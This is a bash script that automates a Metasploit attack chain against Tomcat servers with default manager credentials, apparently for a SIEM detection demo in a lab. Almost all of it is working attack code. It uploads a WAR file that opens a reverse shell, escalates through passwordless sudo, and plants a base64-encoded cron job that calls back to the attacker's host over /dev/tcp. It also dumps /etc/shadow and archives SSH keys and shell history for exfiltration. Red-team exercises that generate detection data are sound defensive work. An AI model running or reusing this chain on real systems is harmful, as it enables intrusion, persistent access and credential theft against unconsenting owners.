#!/bin/bash
# run-metasploit.sh - Automated Metasploit attack against vulnerable Tomcat hosts
#
# This script automates the full attack chain for the SIEM workflow demo.
# It exploits Tomcat Manager with weak credentials, establishes a reverse shell,
# then runs discovery, privilege escalation, persistence, credential access,
# and collection phases.
#
# Prerequisites:
#   - Metasploit Framework installed (msfconsole)
#   - Target must have vulnerable Tomcat 9.0.30 with weak credentials (tomcat/tomcat)
#   - Network connectivity between attacker and target
#
# Usage:
#   ./run-metasploit.sh -t <TARGET_IP> -a <ATTACKER_IP> [-p <LPORT>]
#   ./run-metasploit.sh -t 10.0.1.10 -a 10.0.1.200
#   ./run-metasploit.sh -t 10.0.1.10 -a 10.0.1.200 -p 4444

set -euo pipefail

# Defaults
LPORT=4444
PERSISTENCE_PORT=4445

usage() {
    echo "Usage: $0 -t <TARGET_IP> -a <ATTACKER_IP> [-p <LPORT>]"
    echo ""
    echo "  -t    Target IP address (host VM running vulnerable Tomcat)"
    echo "  -a    Attacker IP address (this red team VM)"
    echo "  -p    Listener port for reverse shell (default: 4444)"
    echo ""
    echo "Example:"
    echo "  $0 -t 10.0.1.10 -a 10.0.1.200"
    exit 1
}

while getopts "t:a:p:h" opt; do
    case $opt in
        t) TARGET_IP="$OPTARG" ;;
        a) ATTACKER_IP="$OPTARG" ;;
        p) LPORT="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "${TARGET_IP:-}" || -z "${ATTACKER_IP:-}" ]]; then
    echo "ERROR: Both -t (target) and -a (attacker) are required."
    echo ""
    usage
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log() { echo -e "${MAGENTA}[run-metasploit]${NC} $1"; }
phase() {
    echo ""
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo -e "${MAGENTA}[run-metasploit]${NC} ${WHITE}PHASE $1: $2${NC}"
    echo -e "${MAGENTA}[run-metasploit]${NC} ${CYAN}MITRE ATT&CK: $3${NC}"
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo ""
    echo -e "${MAGENTA}[run-metasploit]${NC} $4"
    echo ""
}

# Clean up previous runs
cleanup() {
    pkill -9 msfconsole 2>/dev/null || true
    pkill -9 -f "nc.*${LPORT}" 2>/dev/null || true
    pkill -9 -f "nc.*${PERSISTENCE_PORT}" 2>/dev/null || true
    rm -f /tmp/run-metasploit.rc 2>/dev/null || true
    sleep 1
}

# Build the cron job payload (base64 encoded to avoid escaping issues)
CRON_LINE="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${PERSISTENCE_PORT} 0>&1'"
CRON_B64=$(echo "$CRON_LINE" | base64 -w0)

# Build the Metasploit resource script
build_rc() {
    cat > /tmp/run-metasploit.rc << RCEOF
# ============================================================================
# CLEANUP: Kill any existing sessions and handlers
# ============================================================================
sessions -K
jobs -K

# ============================================================================
# PHASE 1: INITIAL ACCESS - Exploit Tomcat Manager
# ============================================================================
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT ${LPORT}
set ExitOnSession true
exploit -j

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS ${TARGET_IP}
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set FingerprintCheck false
set payload java/shell_reverse_tcp
set LHOST ${ATTACKER_IP}
set LPORT ${LPORT}
set DisablePayloadHandler true
exploit

sleep 3
sessions -l

<ruby>
# Helper: run a command on the session and display it
def run_cmd(cmd, session_id)
  print "\033[0;36m\$ \033[0m"
  cmd.each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
  puts ""
  sleep(0.25)
  run_single("sessions -c '#{cmd}' #{session_id}")
  sleep(0.5)
end

# Check if we got a session
if framework.sessions.count == 0
  puts ""
  puts "\033[0;35m[run-metasploit]\033[0m \033[0;31mFAILED: No reverse shell established.\033[0m"
  puts "\033[0;35m[run-metasploit]\033[0m Check: target running? security groups? IPs correct?"
  puts ""
  \$msf_abort = true
  run_single("exit")
end

\$session_id = framework.sessions.keys.first
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Reverse shell established (session #{\$session_id})"
puts ""
</ruby>

# ============================================================================
# PHASE 3: DISCOVERY
# ============================================================================
<ruby>
puts ""
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[1;37mPHASE 3: DISCOVERY\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[0;36mMITRE ATT&CK: T1082 - System Information Discovery\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Enumerating system info, users, and network."
puts ""
sleep(3)

run_cmd("whoami", \$session_id)
run_cmd("id", \$session_id)
run_cmd("uname -a", \$session_id)
run_cmd("hostname", \$session_id)
run_cmd("cat /etc/passwd | grep -v nologin", \$session_id)

puts ""
puts "\033[0;35m[run-metasploit]\033[0m Discovery complete."
puts ""
</ruby>

# ============================================================================
# PHASE 4: PRIVILEGE ESCALATION
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[1;37mPHASE 4: PRIVILEGE ESCALATION\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[0;36mMITRE ATT&CK: T1548 - Abuse Elevation Control Mechanism\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Checking sudo privileges for tomcat user."
puts ""
sleep(3)

run_cmd("sudo -l", \$session_id)
run_cmd("sudo whoami", \$session_id)

puts ""
puts "\033[0;35m[run-metasploit]\033[0m Privilege escalation successful - tomcat has passwordless sudo."
puts ""
</ruby>

# ============================================================================
# PHASE 5: PERSISTENCE
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[1;37mPHASE 5: PERSISTENCE\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[0;36mMITRE ATT&CK: T1053.003 - Scheduled Task/Job: Cron\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Installing cron job for persistent callback to ${ATTACKER_IP}:${PERSISTENCE_PORT}."
puts ""
sleep(3)

session = framework.sessions[\$session_id]
session.shell_command_token("echo ${CRON_B64} | base64 -d > /tmp/.cron")
session.shell_command_token("sudo crontab /tmp/.cron")
session.shell_command_token("rm -f /tmp/.cron")
sleep(0.5)

print "\033[0;36m\$ \033[0m"
"sudo crontab -l".each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
puts ""
result = session.shell_command_token("sudo crontab -l")
puts result

puts ""
puts "\033[0;35m[run-metasploit]\033[0m Persistence established via cron."
puts ""
</ruby>

# ============================================================================
# PHASE 6: CREDENTIAL ACCESS
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[1;37mPHASE 6: CREDENTIAL ACCESS\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[0;36mMITRE ATT&CK: T1003.008 - OS Credential Dumping: /etc/shadow\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Extracting password hashes from /etc/shadow."
puts ""
sleep(3)

run_cmd("sudo cat /etc/shadow", \$session_id)

puts ""
puts "\033[0;35m[run-metasploit]\033[0m Password hashes extracted."
puts ""
</ruby>

# ============================================================================
# PHASE 7: COLLECTION
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[1;37mPHASE 7: COLLECTION\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[0;36mMITRE ATT&CK: T1560.001 - Archive Collected Data\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Archiving sensitive files for exfiltration."
puts ""
sleep(3)

tar_cmd = "sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.bash_history"
print "\033[0;36m\$ \033[0m"
tar_cmd.each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
puts ""
sleep(0.25)
run_single("sessions -c '#{tar_cmd} 2>&1' #{\$session_id}")
sleep(0.5)

run_cmd("ls -la /tmp/loot.tar.gz", \$session_id)

puts ""
puts "\033[0;35m[run-metasploit]\033[0m Sensitive files archived."
puts ""
</ruby>

# ============================================================================
# COMPLETE
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[run-metasploit]\033[0m \033[1;37mATTACK CHAIN COMPLETE\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m Phases executed:"
puts "\033[0;35m[run-metasploit]\033[0m   1. Initial Access       - Exploited Tomcat Manager (weak creds)"
puts "\033[0;35m[run-metasploit]\033[0m   3. Discovery            - Enumerated system, users, network"
puts "\033[0;35m[run-metasploit]\033[0m   4. Privilege Escalation - Passwordless sudo to root"
puts "\033[0;35m[run-metasploit]\033[0m   5. Persistence          - Cron job for persistent callback"
puts "\033[0;35m[run-metasploit]\033[0m   6. Credential Access    - Extracted /etc/shadow hashes"
puts "\033[0;35m[run-metasploit]\033[0m   7. Collection           - Archived sensitive files"
puts ""
puts "\033[0;35m[run-metasploit]\033[0m All phases complete."
puts ""
</ruby>

sessions -K
exit
RCEOF
}

# --- Main ---

echo ""
echo -e "${RED} ____  ___ ___ __  __   ____                       ${NC}"
echo -e "${RED}/ ___|/_ _| __|  \\/  | |  _ \\  ___ _ __ ___   ___  ${NC}"
echo -e "${RED}\\___ \\ | || _|| |\\/| | | | | |/ _ \\ '_ \` _ \\ / _ \\ ${NC}"
echo -e "${RED} ___) || || |_| |  | | | |_| |  __/ | | | | | (_) |${NC}"
echo -e "${RED}|____/|___|___|_|  |_| |____/ \\___|_| |_| |_|\\___/ ${NC}"
echo ""
echo -e "${WHITE}        Metasploit Attack Automation${NC}"
echo ""

log "Target:   ${TARGET_IP}"
log "Attacker: ${ATTACKER_IP}"
log "Port:     ${LPORT}"
echo ""

# Pre-flight: verify target Tomcat is reachable
log "Checking target Tomcat on ${TARGET_IP}:8080..."
if curl -s --connect-timeout 5 "http://${TARGET_IP}:8080" > /dev/null 2>&1; then
    log "${GREEN}Tomcat is reachable${NC}"
else
    log "${RED}WARNING: Cannot reach Tomcat on ${TARGET_IP}:8080${NC}"
    log "Continuing anyway (cloud-init may still be running)..."
fi

# Check manager credentials
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 -u tomcat:tomcat "http://${TARGET_IP}:8080/manager/text/list" 2>/dev/null || echo "000")
if [[ "$HTTP_CODE" == "200" ]]; then
    log "${GREEN}Manager credentials valid (tomcat/tomcat)${NC}"
else
    log "${YELLOW}Manager returned HTTP ${HTTP_CODE} - credentials may not work yet${NC}"
fi

echo ""

# Clean up previous runs
log "Cleaning up previous sessions..."
cleanup

# Build and run
log "Building Metasploit resource script..."
build_rc

phase "1" "INITIAL ACCESS" "T1190 - Exploit Public-Facing Application" \
    "Exploiting Tomcat Manager with weak credentials to upload a malicious WAR file and get a reverse shell."

log "Launching Metasploit..."
echo ""
msfconsole -q -r /tmp/run-metasploit.rc

echo ""
log "${GREEN}Attack complete.${NC}"
